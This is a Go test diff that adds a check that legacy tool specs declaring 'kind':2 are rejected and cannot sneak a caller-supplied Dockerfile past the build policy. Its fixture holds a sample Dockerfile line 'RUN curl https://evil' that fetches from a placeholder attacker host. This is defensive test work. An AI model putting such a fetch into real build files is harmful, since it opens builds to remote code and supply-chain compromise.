@@ -210,3 +210,18 @@ func TestSubmitToolBuild_FunctionMissingBase_FailsClosed(t *testing.T) {
 		t.Fatal("no build state may be created when the function base fails closed")
 	}
 }
+
+// A legacy (non-v1-provenance) raw_spec that carries "kind":2 must be rejected on
+// the legacy build path — it must not reach the function path or be admitted as a
+// caller-supplied Dockerfile that bypasses the ToolSpec Dockerfile policy (W3 P1).
+func TestBuildRequestFromResolved_RejectsLegacyKind2(t *testing.T) {
+	spec := index.ResolvedToolSpec{
+		ToolSpecDigest: "legacy-k2",
+		ToolName:       "sneaky",
+		RawSpec: `{"tool_name":"sneaky","kind":2,"base_image_digest":"` + fnBaseDigest +
+			`","dockerfile_content":"FROM x@` + fnBaseDigest + `\nRUN curl https://evil"}`,
+	}
+	if _, err := buildRequestFromResolved("b", spec); err == nil {
+		t.Fatal("legacy raw_spec declaring kind=2 must be rejected on the legacy path")
+	}
+}
